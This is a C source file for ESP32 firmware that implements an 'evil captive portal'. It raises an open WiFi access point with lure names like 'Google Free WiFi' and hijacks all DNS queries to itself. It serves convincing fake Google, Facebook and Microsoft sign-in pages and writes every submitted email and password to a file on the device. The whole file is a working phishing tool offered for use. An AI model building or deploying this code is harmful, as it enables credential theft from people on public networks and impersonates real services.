/*
 * nesso_portal.c — Evil captive portal.
 *
 * Creates a WiFi AP, starts an HTTP server that serves a fake login page,
 * and redirects all DNS queries to itself (captive portal detection).
 * Captured credentials are logged to /storage/portal_creds.txt.
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "esp_check.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "lwip/sockets.h"
#include "lwip/dns.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "nesso_portal.h"

static const char *TAG = "portal";

static bool s_active = false;
static httpd_handle_t s_httpd = NULL;
static esp_netif_t *s_ap_netif = NULL;
static TaskHandle_t s_dns_task = NULL;
static uint32_t s_cred_count = 0;
static FILE *s_cred_file = NULL;

/* -------------------- HTML templates -------------------- */

static const char *s_template_ssids[] = {
    "Google Free WiFi",
    "Facebook Connect",
    "Microsoft WiFi",
    "Free WiFi",
};

static const char s_html_google[] =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;"
    "background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.2);padding:40px;width:360px;text-align:center}"
    ".logo{color:#4285f4;font-size:32px;font-weight:700;margin-bottom:8px}"
    ".sub{color:#5f6368;margin-bottom:24px}input{width:100%;padding:12px;margin:8px 0;"
    "border:1px solid #dadce0;border-radius:4px;font-size:14px}input:focus{border-color:#4285f4;outline:none}"
    ".btn{background:#4285f4;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;"
    "font-size:14px;cursor:pointer;margin-top:16px}.btn:hover{background:#3367d6}"
    "</style></head><body><div class='card'>"
    "<div class='logo'>Google</div>"
    "<div class='sub'>Sign in to continue to WiFi</div>"
    "<form action='/login' method='POST'>"
    "<input name='email' type='email' placeholder='Email' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button class='btn' type='submit'>Sign in</button>"
    "</form></div></body></html>";

static const char s_html_facebook[] =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:Helvetica,sans-serif;"
    "display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px;width:360px}"
    ".logo{color:#1877f2;font-size:36px;font-weight:700;text-align:center;margin-bottom:16px}"
    "input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:15px}"
    ".btn{background:#1877f2;color:#fff;border:none;padding:14px;width:100%;border-radius:6px;"
    "font-size:16px;font-weight:700;cursor:pointer;margin-top:12px}"
    ".divider{border-top:1px solid #dadde1;margin:16px 0}"
    "</style></head><body><div class='card'>"
    "<div class='logo'>facebook</div>"
    "<form action='/login' method='POST'>"
    "<input name='email' placeholder='Email or phone number' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button class='btn' type='submit'>Log In</button>"
    "</form><div class='divider'></div>"
    "<p style='text-align:center;color:#65676b;font-size:13px'>Connect to free WiFi</p>"
    "</div></body></html>";

static const char s_html_microsoft[] =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f2f2f2;font-family:Segoe UI,sans-serif;"
    "display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}"
    ".logo{font-size:20px;font-weight:600;margin-bottom:4px}img{width:108px;margin-bottom:16px}"
    ".sub{color:#1b1b1b;font-size:24px;margin-bottom:24px}input{width:100%;padding:8px 4px;"
    "margin:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none}"
    ".btn{background:#0067b8;color:#fff;border:none;padding:10px 32px;font-size:15px;cursor:pointer;margin-top:24px}"
    "</style></head><body><div class='card'>"
    "<div class='logo'>Microsoft</div>"
    "<div class='sub'>Sign in</div>"
    "<form action='/login' method='POST'>"
    "<input name='email' placeholder='Email, phone, or Skype' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button class='btn' type='submit'>Sign in</button>"
    "</form></div></body></html>";

static const char s_html_wifi[] =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1a2e;color:#fff;font-family:sans-serif;"
    "display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".card{background:#16213e;border-radius:12px;padding:32px;width:340px;text-align:center;"
    "box-shadow:0 4px 20px rgba(0,0,0,.5)}"
    "h2{color:#0ff;margin-bottom:8px}p{color:#a0a0a0;margin-bottom:24px;font-size:14px}"
    "input{width:100%;padding:12px;margin:8px 0;background:#0f3460;border:1px solid #0ff;border-radius:6px;"
    "color:#fff;font-size:14px}input::placeholder{color:#666}"
    ".btn{background:#0ff;color:#000;border:none;padding:12px;width:100%;border-radius:6px;"
    "font-size:14px;font-weight:700;cursor:pointer;margin-top:16px}"
    "</style></head><body><div class='card'>"
    "<h2>Free WiFi Access</h2>"
    "<p>Sign in to connect to the internet</p>"
    "<form action='/login' method='POST'>"
    "<input name='email' placeholder='Email address' required>"
    "<input name='password' type='password' placeholder='Password' required>"
    "<button class='btn' type='submit'>Connect</button>"
    "</form></div></body></html>";

static const char *s_templates[] = {
    s_html_google,
    s_html_facebook,
    s_html_microsoft,
    s_html_wifi,
};

static const char s_html_success[] =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{display:flex;justify-content:center;align-items:center;min-height:100vh;"
    "font-family:sans-serif;background:#1a1a2e;color:#fff}"
    "</style></head><body><div style='text-align:center'>"
    "<h2 style='color:#0f0'>Connected!</h2>"
    "<p>You may now use the internet.</p>"
    "</div></body></html>";

static nesso_portal_template_t s_template = PORTAL_TEMPLATE_WIFI_LOGIN;

/* -------------------- HTTP handlers -------------------- */

static esp_err_t root_handler(httpd_req_t *req)
{
    const char *html = s_templates[s_template % PORTAL_TEMPLATE_COUNT];
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static esp_err_t login_handler(httpd_req_t *req)
{
    char buf[256] = {0};
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len > 0) {
        buf[len] = '\0';
        ESP_LOGI(TAG, "CREDS CAPTURED: %s", buf);
        s_cred_count++;

        if (s_cred_file) {
            fprintf(s_cred_file, "%s\n", buf);
            fflush(s_cred_file);
        }
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, s_html_success, strlen(s_html_success));
    return ESP_OK;
}

/* Catch-all handler — redirect everything to the portal. */
static esp_err_t redirect_handler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

/* -------------------- DNS hijack -------------------- */

/* Simple DNS server that responds to ALL queries with our AP IP. */
static void dns_task(void *arg)
{
    (void)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) { s_dns_task = NULL; vTaskDelete(NULL); return; }

    struct sockaddr_in saddr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    bind(sock, (struct sockaddr *)&saddr, sizeof(saddr));

    struct timeval tv = { .tv_sec = 1 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t buf[512];
    struct sockaddr_in client;
    socklen_t clen = sizeof(client);

    while (s_active) {
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&client, &clen);
        if (n < 12) continue;

        /* Build minimal DNS response — point everything to 192.168.4.1 */
        buf[2] = 0x81; buf[3] = 0x80;  /* flags: response, no error */
        buf[6] = buf[4]; buf[7] = buf[5];  /* answer count = question count */

        /* Append a single A record answer. */
        int off = n;
        buf[off++] = 0xC0; buf[off++] = 0x0C;  /* name pointer to question */
        buf[off++] = 0x00; buf[off++] = 0x01;  /* type A */
        buf[off++] = 0x00; buf[off++] = 0x01;  /* class IN */
        buf[off++] = 0x00; buf[off++] = 0x00;
        buf[off++] = 0x00; buf[off++] = 0x0A;  /* TTL 10s */
        buf[off++] = 0x00; buf[off++] = 0x04;  /* data length */
        buf[off++] = 192; buf[off++] = 168;
        buf[off++] = 4;   buf[off++] = 1;      /* 192.168.4.1 */

        sendto(sock, buf, off, 0, (struct sockaddr *)&client, clen);
    }

    close(sock);
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

/* -------------------- lifecycle -------------------- */

esp_err_t nesso_portal_start(const nesso_portal_config_t *cfg)
{
    if (s_active) return ESP_OK;
    if (!cfg) return ESP_ERR_INVALID_ARG;

    s_template = cfg->template_id;
    s_cred_count = 0;

    /* Stop WiFi STA mode and switch to AP. */
    esp_wifi_stop();

    if (!s_ap_netif) s_ap_netif = esp_netif_create_default_wifi_ap();

    wifi_config_t ap_cfg = {
        .ap = {
            .channel = cfg->channel ? cfg->channel : 1,
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN,
        },
    };
    const char *ssid = cfg->ssid[0] ? cfg->ssid : s_template_ssids[s_template % PORTAL_TEMPLATE_COUNT];
    strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid));
    ap_cfg.ap.ssid_len = strlen(ssid);

    ESP_RETURN_ON_ERROR(esp_wifi_set_mode(WIFI_MODE_AP), TAG, "set AP mode");
    ESP_RETURN_ON_ERROR(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg), TAG, "set AP config");
    ESP_RETURN_ON_ERROR(esp_wifi_start(), TAG, "start AP");

    ESP_LOGI(TAG, "AP started: \"%s\"", ssid);

    /* Open cred log file. */
    s_cred_file = fopen("/storage/portal_creds.txt", "a");

    /* Start HTTP server. */
    httpd_config_t http_cfg = HTTPD_DEFAULT_CONFIG();
    http_cfg.max_uri_handlers = 8;
    http_cfg.uri_match_fn = httpd_uri_match_wildcard;

    ESP_RETURN_ON_ERROR(httpd_start(&s_httpd, &http_cfg), TAG, "httpd start");

    httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_handler };
    httpd_uri_t login = { .uri = "/login", .method = HTTP_POST, .handler = login_handler };
    httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = redirect_handler };

    httpd_register_uri_handler(s_httpd, &root);
    httpd_register_uri_handler(s_httpd, &login);
    httpd_register_uri_handler(s_httpd, &catchall);

    /* Start DNS hijack. */
    s_active = true;
    xTaskCreate(dns_task, "dns_hijack", 4096, NULL, 5, &s_dns_task);

    ESP_LOGI(TAG, "evil portal active — template %d", s_template);
    return ESP_OK;
}

esp_err_t nesso_portal_stop(void)
{
    if (!s_active) return ESP_OK;
    s_active = false;

    /* Stop DNS. */
    for (int i = 0; i < 20 && s_dns_task; ++i) vTaskDelay(pdMS_TO_TICKS(100));

    /* Stop HTTP. */
    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }

    /* Close cred file. */
    if (s_cred_file) { fclose(s_cred_file); s_cred_file = NULL; }

    /* Switch back to STA mode. */
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE);

    ESP_LOGI(TAG, "portal stopped, back to STA mode");
    return ESP_OK;
}

bool nesso_portal_is_active(void) { return s_active; }
uint32_t nesso_portal_cred_count(void) { return s_cred_count; }

uint8_t nesso_portal_client_count(void)
{
    if (!s_active) return 0;
    wifi_sta_list_t list;
    if (esp_wifi_ap_get_sta_list(&list) == ESP_OK) return list.num;
    return 0;
}
